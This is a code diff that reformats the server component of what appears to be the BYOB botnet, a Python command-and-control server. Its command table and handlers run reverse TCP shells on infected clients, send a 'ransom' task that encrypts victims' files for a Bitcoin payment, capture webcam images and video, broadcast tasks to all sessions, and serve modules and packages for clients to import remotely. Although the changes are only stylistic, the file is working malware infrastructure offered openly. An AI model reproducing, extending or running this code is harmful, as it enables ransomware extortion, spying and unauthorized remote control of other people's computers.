@@ -27,8 +27,8 @@ import core.database as database
 import core.security as security
 
 # globals
-packages = ['cv2','colorama','SocketServer']
-platforms = ['win32','linux2','darwin']
+packages = ['cv2', 'colorama', 'SocketServer']
+platforms = ['win32', 'linux2', 'darwin']
 
 # setup
 util.is_compatible(platforms, __name__)
@@ -56,12 +56,15 @@ try:
     import colorama
     colorama.init(autoreset=True)
 except ImportError:
-   util.log("installing required Python package 'colorama'...")
-   execfile('setup.py')
-   util.log("restarting...")
-   os.execv(sys.executable, ['python'] + [os.path.abspath(sys.argv[0])] + sys.argv[1:])
+    util.log("installing required Python package 'colorama'...")
+    execfile('setup.py')
+    util.log("restarting...")
+    os.execv(sys.executable, ['python'] +
+             [os.path.abspath(sys.argv[0])] + sys.argv[1:])
 
 # main
+
+
 def main():
     parser = argparse.ArgumentParser(
         prog='server.py',
@@ -90,18 +93,23 @@ def main():
         help='SQLite database')
 
     modules = os.path.abspath('modules')
-    packages = [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if os.path.basename(_) == 'site-packages'] if len([os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if os.path.basename(_) == 'site-packages']) else [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if 'local' not in _ if os.path.basename(_) == 'dist-packages']
-    
+    packages = [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if os.path.basename(_) == 'site-packages'] if len([os.path.abspath(_) for _ in sys.path if os.path.isdir(
+        _) if os.path.basename(_) == 'site-packages']) else [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if 'local' not in _ if os.path.basename(_) == 'dist-packages']
+
     if not len(packages):
-        util.log("unable to locate 'site-packages' in sys.path (directory containing user-installed packages/modules)")
+        util.log(
+            "unable to locate 'site-packages' in sys.path (directory containing user-installed packages/modules)")
         sys.exit(0)
 
     packages = packages[0]
     options = parser.parse_args()
 
-    globals()['package_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=packages, shell=True)
-    globals()['module_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 1), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=modules, shell=True)
-    globals()['c2'] = C2(host=options.host, port=options.port, db=options.database)
+    globals()['package_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable,
+                                                                                       options.port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=packages, shell=True)
+    globals()['module_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable,
+                                                                                      options.port + 1), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=modules, shell=True)
+    globals()['c2'] = C2(host=options.host,
+                         port=options.port, db=options.database)
 
     c2.run()
 
@@ -113,7 +121,7 @@ class C2():
     as handling session authentication & management, serving up any scripts/modules/packages requested
     by clients to remotely import them, issuing tasks assigned by the user to any/all clients, handling
     incoming completed tasks from clients
-    
+
     """
 
     _lock = threading.Lock()
@@ -132,7 +140,7 @@ class C2():
                                 *.db     (persistent)
 
         Returns a byob.server.C2 instance
-        
+
         """
         self._active = threading.Event()
         self._count = 1
@@ -143,59 +151,59 @@ class C2():
         self.socket = self._socket(port)
         self.banner = self._banner()
         self.commands = {
-            'set' : {
+            'set': {
                 'method': self.set,
                 'usage': 'set <setting> [option=value]',
                 'description': 'change the value of a setting'},
-            'help' : {
+            'help': {
                 'method': self.help,
                 'usage': 'help',
                 'description': 'show usage help for server commands'},
-            'exit' : {
+            'exit': {
                 'method': self.quit,
                 'usage': 'exit',
                 'description': 'quit the server'},
-            'eval' : {
+            'eval': {
                 'method': self.eval,
                 'usage': 'eval <code>',
                 'description': 'execute python code directly on server (debugging MUST be enabled)'},
-            'query' : {
+            'query': {
                 'method': self.query,
                 'usage': 'query <statement>',
                 'description': 'query the SQLite database'},
-            'options' : {
+            'options': {
                 'method': self.settings,
                 'usage': 'options',
                 'description': 'show currently configured settings'},
-            'sessions' : {
+            'sessions': {
                 'method': self.session_list,
                 'usage': 'sessions',
                 'description': 'show active client sessions'},
-            'clients' : {
+            'clients': {
                 'method': self.session_list,
                 'usage': 'clients',
                 'description': 'show all clients that have joined the server'},
-            'shell' : {
+            'shell': {
                 'method': self.session_shell,
                 'usage': 'shell <id>',
                 'description': 'interact with a client with a reverse TCP shell through an active session'},
-            'ransom' : {
+            'ransom': {
                 'method': self.session_ransom,
                 'usage': 'ransom [id]',
                 'description': 'encrypt client files & ransom encryption key for a Bitcoin payment'},
-            'webcam' : {
+            'webcam': {
                 'method': self.session_webcam,
                 'usage': 'webcam <mode>',
                 'description': 'capture image/video from the webcam of a client device'},
-            'kill' : {
+            'kill': {
                 'method': self.session_remove,
                 'usage': 'kill <id>',
                 'description': 'end a session'},
-            'bg' : {
+            'bg': {
                 'method': self.session_background,
                 'usage': 'bg [id]',
                 'description': 'background a session (default: the current session)'},
-            'broadcast' : {
+            'broadcast': {
                 'method': self.task_broadcast,
                 'usage': 'broadcast <command>',
                 'description': 'broadcast a task to all active sessions'},
@@ -203,7 +211,7 @@ class C2():
                 'method': self.task_list,
                 'usage': 'results [id]',
                 'description': 'display all completed task results for a client (default: all clients)'},
-            'tasks' : {
+            'tasks': {
                 'method': self.task_list,
                 'usage': 'tasks [id]',
                 'description': 'display all incomplete tasks for a client (default: all clients)'}}
@@ -213,24 +221,31 @@ class C2():
         if isinstance(info, str):
             try:
                 info = json.loads(info)
-            except: pass
+            except:
+                pass
         if isinstance(info, dict):
-            max_key = int(max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) if int(max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) < 80 else 80
-            max_val = int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) if int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) < 80 else 80
-            key_len = {len(str(i2)): str(i2) for i2 in info.keys() if i2 if i2 != 'None'}
+            max_key = int(max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) if int(
+                max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) < 80 else 80
+            max_val = int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) if int(
+                max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) < 80 else 80
+            key_len = {len(str(i2)): str(i2)
+                       for i2 in info.keys() if i2 if i2 != 'None'}
             keys = {k: key_len[k] for k in sorted(key_len.keys())}
             with lock:
                 for key in keys.values():
                     if info.get(key) and info.get(key) != 'None':
                         if len(str(info.get(key))) > 80:
                             info[key] = str(info.get(key))[:77] + '...'
-                        info[key] = str(info.get(key)).replace('\n',' ') if not isinstance(info.get(key), datetime.datetime) else str(v).encode().replace("'", '"').replace('True','true').replace('False','false') if not isinstance(v, datetime.datetime) else str(int(time.mktime(v.timetuple())))
+                        info[key] = str(info.get(key)).replace('\n', ' ') if not isinstance(info.get(key), datetime.datetime) else str(v).encode().replace(
+                            "'", '"').replace('True', 'true').replace('False', 'false') if not isinstance(v, datetime.datetime) else str(int(time.mktime(v.timetuple())))
                         util.display('\x20' * 4, end=',')
-                        util.display(key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2), color=self._text_color, style=self._text_style)
+                        util.display(key.ljust(max_key).center(max_key + 2) + info[key].ljust(
+                            max_val).center(max_val + 2), color=self._text_color, style=self._text_style)
         else:
             with lock:
                 util.display('\x20' * 4, end=',')
-                util.display(str(info), color=self._text_color, style=self._text_style)
+                util.display(str(info), color=self._text_color,
+                             style=self._text_style)
 
     def _socket(self, port):
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -240,7 +255,8 @@ class C2():
         return s
 
     def _return(self, data=None):
-        lock, prompt = (self.current_session._lock, self.current_session._prompt) if self.current_session else (self._lock, self._prompt)
+        lock, prompt = (self.current_session._lock, self.current_session._prompt) if self.current_session else (
+            self._lock, self._prompt)
         with lock:
             if data:
                 util.display('\n{}\n'.format(data))
@@ -248,15 +264,18 @@ class C2():
 
     def _banner(self):
         with self._lock:
-            util.display(__banner__, color=random.choice(['red','green','cyan','magenta','yellow']), style='bright')
+            util.display(__banner__, color=random.choice(
+                ['red', 'green', 'cyan', 'magenta', 'yellow']), style='bright')
             util.display("[?] ", color='yellow', style='bright', end=',')
-            util.display("Hint: show usage information with the 'help' command\n", color='white', style='normal')
+            util.display("Hint: show usage information with the 'help' command\n",
+                         color='white', style='normal')
         return __banner__
 
     def _get_arguments(self, data):
         args = tuple([i.strip('-') for i in str(data).split() if '=' not in i])
-        kwds = dict({i.partition('=')[0].strip('-'): i.partition('=')[2].strip('-') for i in str(data).split() if '=' in i})
-        return collections.namedtuple('Arguments', ('args','kwargs'))(args, kwds)
+        kwds = dict({i.partition('=')[0].strip(
+            '-'): i.partition('=')[2].strip('-') for i in str(data).split() if '=' in i})
+        return collections.namedtuple('Arguments', ('args', 'kwargs'))(args, kwds)
 
     def _get_session_by_id(self, session):
         session = None
@@ -279,7 +298,8 @@ class C2():
             else:
                 util.log("session not found for: {}".format(peer))
         else:
-            util.log("Invalid input type (expected '{}', received '{}')".format(socket.socket, type(connection)))
+            util.log("Invalid input type (expected '{}', received '{}')".format(
+                socket.socket, type(connection)))
         return session
 
     def _get_prompt(self, data):
@@ -292,7 +312,7 @@ class C2():
 
         `Requires`
         :param str code:    Python code to execute
-        
+
         """
         if globals()['__debug']:
             try:
@@ -305,7 +325,7 @@ class C2():
     def quit(self):
         """ 
         Quit server and optionally keep clients alive
-        
+
         """
         globals()['package_handler'].terminate()
         globals()['module_handler'].terminate()
@@ -315,7 +335,8 @@ class C2():
                 session.send_task('passive')
         globals()['__abort'] = True
         self._active.clear()
-        _ = os.popen("taskkill /pid {} /f".format(os.getpid()) if os.name == 'nt' else "kill -9 {}".format(os.getpid())).read()
+        _ = os.popen("taskkill /pid {} /f".format(os.getpid()) if os.name ==
+                     'nt' else "kill -9 {}".format(os.getpid())).read()
         util.display('Exiting...')
         sys.exit(0)
 
@@ -325,17 +346,20 @@ class C2():
 
         `Optional`
         :param dict info:   client usage help
-        
+
         """
         column1 = 'command <arg>'
         column2 = 'description'
-        info = info if info else {command['usage']: command['description'] for command in self.commands.values()}
+        info = info if info else {
+            command['usage']: command['description'] for command in self.commands.values()}
         max_key = max(map(len, info.keys() + [column1])) + 2
         max_val = max(map(len, info.values() + [column2])) + 2
         util.display('\n', end=',')
-        util.display(column1.center(max_key) + column2.center(max_val), color=self._text_color, style='bright')
+        util.display(column1.center(max_key) + column2.center(max_val),
+                     color=self._text_color, style='bright')
         for key in sorted(info):
-            util.display(key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2), color=self._text_color, style=self._text_style)
+            util.display(key.ljust(max_key).center(max_key + 2) + info[key].ljust(
+                max_val).center(max_val + 2), color=self._text_color, style=self._text_style)
         util.display("\n", end=',')
 
     def display(self, info):
@@ -354,15 +378,18 @@ class C2():
             elif isinstance(info, list):
                 if len(info):
                     for data in info:
-                        util.display('  %d\n' % int(info.index(data) + 1), color=self._text_color, style='bright', end="")
+                        util.display('  %d\n' % int(info.index(data) + 1),
+                                     color=self._text_color, style='bright', end="")
                         self._print(data)
             elif isinstance(info, str):
                 try:
                     self._print(json.loads(info))
                 except:
-                    util.display(str(info), color=self._text_color, style=self._text_style)
+                    util.display(str(info), color=self._text_color,
+                                 style=self._text_style)
             else:
-                util.log("{} error: invalid data type '{}'".format(self.display.func_name, type(info)))
+                util.log("{} error: invalid data type '{}'".format(
+                    self.display.func_name, type(info)))
             print
 
     def query(self, statement):
@@ -378,19 +405,28 @@ class C2():
     def settings(self):
         """
         Show the server's currently configured settings
-        
+
         """
-        text_color = [color for color in filter(str.isupper, dir(colorama.Fore)) if color == self._text_color][0]
-        text_style = [style for style in filter(str.isupper, dir(colorama.Style)) if style == self._text_style][0]
-        prompt_color = [color for color in filter(str.isupper, dir(colorama.Fore)) if color == self._prompt_color][0]
-        prompt_style = [style for style in filter(str.isupper, dir(colorama.Style)) if style == self._prompt_style][0]
+        text_color = [color for color in filter(str.isupper, dir(
+            colorama.Fore)) if color == self._text_color][0]
+        text_style = [style for style in filter(str.isupper, dir(
+            colorama.Style)) if style == self._text_style][0]
+        prompt_color = [color for color in filter(str.isupper, dir(
+            colorama.Fore)) if color == self._prompt_color][0]
+        prompt_style = [style for style in filter(str.isupper, dir(
+            colorama.Style)) if style == self._prompt_style][0]
         util.display('\n\t    OPTIONS', color='white', style='bright')
-        util.display('text color/style: ', color='white', style='normal', end=',')
-        util.display('/'.join((self._text_color.title(), self._text_style.title())), color=self._text_color, style=self._text_style)
-        util.display('prompt color/style: ', color='white', style='normal', end=',')
-        util.display('/'.join((self._prompt_color.title(), self._prompt_style.title())), color=self._prompt_color, style=self._prompt_style)
+        util.display('text color/style: ', color='white',
+                     style='normal', end=',')
+        util.display('/'.join((self._text_color.title(), self._text_style.title())),
+                     color=self._text_color, style=self._text_style)
+        util.display('prompt color/style: ', color='white',
+                     style='normal', end=',')
+        util.display('/'.join((self._prompt_color.title(), self._prompt_style.title())),
+                     color=self._prompt_color, style=self._prompt_style)
         util.display('debug: ', color='white', style='normal', end=',')
-        util.display('True\n' if globals()['__debug'] else 'False\n', color='green' if globals()['__debug'] else 'red', style='normal')
+        util.display('True\n' if globals()['__debug'] else 'False\n', color='green' if globals()[
+                     '__debug'] else 'red', style='normal')
 
     def set(self, args=None):
         """ 
@@ -417,15 +453,17 @@ class C2():
             if arguments.args:
                 target = args[0]
                 args = args[1:]
-                if target in ('debug','debugging'):
+                if target in ('debug', 'debugging'):
                     if args:
                         setting = args[0]
-                        if setting.lower() in ('0','off','false','disable'):
+                        if setting.lower() in ('0', 'off', 'false', 'disable'):
                             globals()['__debug'] = False
-                        elif setting.lower() in ('1','on','true','enable'):
+                        elif setting.lower() in ('1', 'on', 'true', 'enable'):
                             globals()['__debug'] = True
-                        util.display("\n[+]" if globals()['__debug'] else "\n[-]", color='green' if globals()['__debug'] else 'red', style='normal', end=',')
-                        util.display("Debug: {}\n".format("ON" if globals()['__debug'] else "OFF"), color='white', style='bright')
+                        util.display("\n[+]" if globals()['__debug'] else "\n[-]", color='green' if globals()[
+                                     '__debug'] else 'red', style='normal', end=',')
+                        util.display("Debug: {}\n".format("ON" if globals()[
+                                     '__debug'] else "OFF"), color='white', style='bright')
                         return
                 for setting, option in arguments.kwargs.items():
                     option = option.upper()
@@ -436,8 +474,10 @@ class C2():
                         elif setting == 'style':
                             if hasattr(colorama.Style, option):
                                 self._prompt_style = option
-                        util.display("\nprompt color/style changed to ", color='white', style='bright', end=',')
-                        util.display(option + '\n', color=self._prompt_color, style=self._prompt_style)
+                        util.display("\nprompt color/style changed to ",
+                                     color='white', style='bright', end=',')
+                        util.display(
+                            option + '\n', color=self._prompt_color, style=self._prompt_style)
                         return
                     elif target == 'text':
                         if setting == 'color':
@@ -446,10 +486,13 @@ class C2():
                         elif setting == 'style':
                             if hasattr(colorama.Style, option):
                                 self._text_style = option
-                        util.display("\ntext color/style changed to ", color='white', style='bright', end=',')
-                        util.display(option + '\n', color=self._text_color, style=self._text_style)
+                        util.display("\ntext color/style changed to ",
+                                     color='white', style='bright', end=',')
+                        util.display(
+                            option + '\n', color=self._text_color, style=self._text_style)
                         return
-        util.display("\nusage: set [setting] [option]=[value]\n\n    colors:   white/black/red/yellow/green/cyan/magenta\n    styles:   dim/normal/bright\n", color=self._text_color, style=self._text_style)
+        util.display("\nusage: set [setting] [option]=[value]\n\n    colors:   white/black/red/yellow/green/cyan/magenta\n    styles:   dim/normal/bright\n",
+                     color=self._text_color, style=self._text_style)
 
     def task_list(self, id=None):
         """ 
@@ -457,13 +500,13 @@ class C2():
 
         `Requires`
         :param int id:   session ID
-        
+
         """
         lock = self.current_session._lock if self.current_session else self._lock
         tasks = self.database.get_tasks()
         with lock:
             print
-            self.database._display(tasks)        
+            self.database._display(tasks)
             print
 
     def task_broadcast(self, command):
@@ -493,7 +536,7 @@ class C2():
 
         """
         if not self.current_session:
-            util.log( "No client selected")
+            util.log("No client selected")
             return
         client = self.current_session
         result = ''
@@ -504,7 +547,7 @@ class C2():
             retries = 5
             while retries > 0:
                 try:
-                    port = random.randint(6000,9999)
+                    port = random.randint(6000, 9999)
                     s.bind(('0.0.0.0', port))
                     s.listen(1)
                     cmd = 'webcam stream {}'.format(port)
@@ -558,7 +601,8 @@ class C2():
             session = self.sessions[int(session)]
             session._active.clear()
             # send kill command to client
-            session.send_task({"task": "kill", "session": session.info.get('uid')})
+            session.send_task(
+                {"task": "kill", "session": session.info.get('uid')})
             # shutdown the connection
             session.connection.shutdown(socket.SHUT_RDWR)
             session.connection.close()
@@ -611,7 +655,8 @@ class C2():
         """
         if self.current_session:
             if 'decrypt' in str(args):
-                self.current_session.send_task("ransom decrypt %s" % key.exportKey())
+                self.current_session.send_task(
+                    "ransom decrypt %s" % key.exportKey())
             elif 'encrypt' in str(args):
                 self.current_session.send_task("ransom %s" % args)
             else:
@@ -634,7 +679,8 @@ class C2():
             if self.current_session:
                 self.current_session._active.clear()
             self.current_session = self.sessions[int(session)]
-            util.display("\n\nStarting Reverse TCP Shell w/ Session {}...\n".format(self.current_session.id), color='white', style='normal')
+            util.display("\n\nStarting Reverse TCP Shell w/ Session {}...\n".format(
+                self.current_session.id), color='white', style='normal')
             self.current_session._active.set()
             return self.current_session.run()
 
@@ -661,12 +707,16 @@ class C2():
             connection, address = self.socket.accept()
             session = Session(connection=connection, id=self._count)
             util.display("\n\n[+]", color='green', style='bright', end=',')
-            util.display("New Connection:", color='white', style='bright', end=',')
+            util.display("New Connection:", color='white',
+                         style='bright', end=',')
             util.display(address[0], color='white', style='normal')
-            util.display("    Session:", color='white', style='bright', end=',')
+            util.display("    Session:", color='white',
+                         style='bright', end=',')
             util.display(str(self._count), color='white', style='normal')
-            util.display("    Started:", color='white', style='bright', end=',')
-            util.display(time.ctime(session._created) + "\n", color='white', style='normal')
+            util.display("    Started:", color='white',
+                         style='bright', end=',')
+            util.display(time.ctime(session._created) +
+                         "\n", color='white', style='normal')
             info = self.database.handle_session(session.info)
             if isinstance(info, dict):
                 session.info = info
@@ -674,7 +724,8 @@ class C2():
             self._count += 1
 
             prompt = self.current_session._prompt if self.current_session else self._prompt
-            util.display(prompt, color=self._prompt_color, style=self._prompt_style, end=',')
+            util.display(prompt, color=self._prompt_color,
+                         style=self._prompt_style, end=',')
             abort = globals()['__abort']
             if abort:
                 break
@@ -690,24 +741,29 @@ class C2():
         while True:
             try:
                 self._active.wait()
-                self._prompt = "[{} @ %s]> ".format(os.getenv('USERNAME', os.getenv('USER', 'byob'))) % os.getcwd()
+                self._prompt = "[{} @ %s]> ".format(
+                    os.getenv('USERNAME', os.getenv('USER', 'byob'))) % os.getcwd()
                 cmd_buffer = self._get_prompt(self._prompt)
                 if cmd_buffer:
                     output = ''
                     cmd, _, action = cmd_buffer.partition(' ')
                     if cmd in self.commands:
                         try:
-                            output = self.commands[cmd]['method'](action) if len(action) else self.commands[cmd]['method']()
+                            output = self.commands[cmd]['method'](action) if len(
+                                action) else self.commands[cmd]['method']()
                         except Exception as e1:
                             output = str(e1)
                     elif cmd == 'cd':
                         try:
                             os.chdir(action)
-                        except: pass
+                        except:
+                            pass
                     else:
                         try:
-                            output = str().join((subprocess.Popen(cmd_buffer, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate()))
-                        except: pass
+                            output = str().join((subprocess.Popen(cmd_buffer, 0, None, subprocess.PIPE,
+                                                                  subprocess.PIPE, subprocess.PIPE, shell=True).communicate()))
+                        except:
+                            pass
                     if output:
                         util.display(str(output))
                 if globals()['__abort']:
@@ -762,7 +818,7 @@ class Session(threading.Thread):
         """
         Get information about the client host machine
         to identify the session
-        
+
         """
         header_size = struct.calcsize("!L")
         header = self.connection.recv(header_size)
@@ -775,12 +831,14 @@ class Session(threading.Thread):
     def status(self):
         """ 
         Check the status and duration of the session
-        
+
         """
         c = time.time() - float(self._created)
         data = ['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
-                '{} hours'.format(int((c % 86400.0) / 3600.0)) if int((c % 86400.0) / 3600.0) else str(),
-                '{} minutes'.format(int((c % 3600.0) / 60.0)) if int((c % 3600.0) / 60.0) else str(),
+                '{} hours'.format(int((c % 86400.0) / 3600.0)
+                                  ) if int((c % 86400.0) / 3600.0) else str(),
+                '{} minutes'.format(int((c % 3600.0) / 60.0)
+                                    ) if int((c % 3600.0) / 60.0) else str(),
                 '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
         return ', '.join([i for i in data if i])
 
@@ -805,7 +863,7 @@ class Session(threading.Thread):
         if not 'session' in task:
             task['session'] = self.info.get('uid')
         data = security.encrypt_aes(json.dumps(task), self.key)
-        msg  = struct.pack('!L', len(data)) + data
+        msg = struct.pack('!L', len(data)) + data
         self.connection.sendall(msg)
         return True
 
@@ -844,23 +902,28 @@ class Session(threading.Thread):
                         self._active.set()
                     elif 'prompt' in task.get('task'):
                         self._prompt = task
-                        command = globals()['c2']._get_prompt(task.get('result') % int(self.id))
-                        cmd, _, action  = command.partition(' ')
+                        command = globals()['c2']._get_prompt(
+                            task.get('result') % int(self.id))
+                        cmd, _, action = command.partition(' ')
                         if cmd in ('\n', ' ', ''):
                             continue
                         elif cmd in globals()['c2'].commands and cmd != 'help':
-                            result = globals()['c2'].commands[cmd]['method'](action) if len(action) else globals()['c2'].commands[cmd]['method']()
+                            result = globals()['c2'].commands[cmd]['method'](action) if len(
+                                action) else globals()['c2'].commands[cmd]['method']()
                             if result:
-                                task = {'task': cmd, 'result': result, 'session': self.info.get('uid')}
+                                task = {'task': cmd, 'result': result,
+                                        'session': self.info.get('uid')}
                                 globals()['c2'].display(result.encode())
                                 globals()['c2'].database.handle_task(task)
                             continue
                         else:
-                            task = globals()['c2'].database.handle_task({'task': command, 'session': self.info.get('uid')})
+                            task = globals()['c2'].database.handle_task(
+                                {'task': command, 'session': self.info.get('uid')})
                             self.send_task(task)
                     elif 'result' in task:
                         if task.get('result') and task.get('result') != 'None':
-                            globals()['c2'].display(task.get('result').encode())
+                            globals()['c2'].display(
+                                task.get('result').encode())
                             globals()['c2'].database.handle_task(task)
                     else:
                         if self._abort:
